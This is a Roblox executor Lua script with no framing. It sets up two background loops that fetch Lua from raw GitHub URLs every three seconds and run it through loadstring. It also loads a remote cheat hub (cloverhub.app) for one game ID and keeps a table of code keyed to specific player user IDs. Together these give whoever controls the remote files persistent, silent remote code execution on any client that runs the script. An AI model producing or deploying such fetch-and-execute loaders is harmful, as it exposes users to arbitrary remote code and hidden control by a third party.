--------------------------------------------------------------------------------------------------------

-- control all player













local URLLINKS = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"
local ANTOSPAMS = ""

local function LATESS(url)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    local fullUrl = url .. "?v=" .. tick() .. "&r=" .. math.random(1000, 9999)
    
    if req then
        local success, res = pcall(function()
            return req({
                Url = fullUrl,
                Method = "GET",
                Headers = {
                    ["Cache-Control"] = "no-cache, no-store, must-revalidate",
                    ["Pragma"] = "no-cache"
                }
            })
        end)
        if success and res and res.Success then 
            return res.Body 
        end
    end
    
    local success, content = pcall(function()
        return game:HttpGet(fullUrl)
    end)
    
    return success and content or nil
end

task.spawn(function()
    while true do
        local content = LATESS(URLLINKS)
        
        if content and content:match("%S") and content ~= ANTOSPAMS then
            ANTOSPAMS = content
            
            local success, loadedFunc = pcall(loadstring, content)
            if success and loadedFunc then
                pcall(loadedFunc)
            end
        end
        
        task.wait(3)
    end
end)














-----------------------------------------------------------------------------------------------------------

-- player auto execute

















local URLLINK = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/auto_execute_player.lua"
local ANTISPAM = ""

local function LATES(url)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    local fullUrl = url .. "?v=" .. tick() .. "&r=" .. math.random(1000, 9999)
    
    if req then
        local success, res = pcall(function()
            return req({
                Url = fullUrl,
                Method = "GET",
                Headers = {
                    ["Cache-Control"] = "no-cache, no-store, must-revalidate",
                    ["Pragma"] = "no-cache"
                }
            })
        end)
        if success and res and res.Success then 
            return res.Body 
        end
    end
    
    local success, content = pcall(function()
        return game:HttpGet(fullUrl)
    end)
    
    return success and content or nil
end

task.spawn(function()
    while true do
        local content = LATES(URLLINK)
        
        if content and content:match("%S") and content ~= ANTISPAM then
            ANTISPAM = content
            
            local success, loadedFunc = pcall(loadstring, content)
            if success and loadedFunc then
                pcall(loadedFunc)
            end
        end
        
        task.wait(3)
    end
end)    














----------------------------------------------------------------------------------------------------------------

-- game script control

















if not game:IsLoaded() then
    game.Loaded:Wait()
end

local SupportedGames = {

-- script



[107778070777162] = function()     -- STEAL AN EGG

          loadstring(game:HttpGet("https://cloverhub.app/clover.lua"))() -- clover hub



    end,












}

local currentPlaceId = game.PlaceId
local scriptToExecute = SupportedGames[currentPlaceId]

if scriptToExecute then
    scriptToExecute()
end






















--------------------------------------------------------------------------------------------------------------

-- player control
















if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()


local Playercontrol = {


-------------------------------------------------------------------------------------------

-- xian



[10985692688] = function()  -- xianpog8839




end,



--------------------------------------------------

-- enzo


[1561035140] = function()  -- spylil123

print("lil phonk")

end,










}


local currentUserId = LocalPlayer.UserId
local targetScript = Playercontrol[currentUserId]


if targetScript then
    targetScript()
end






---------------------------------------------------------------------------------------
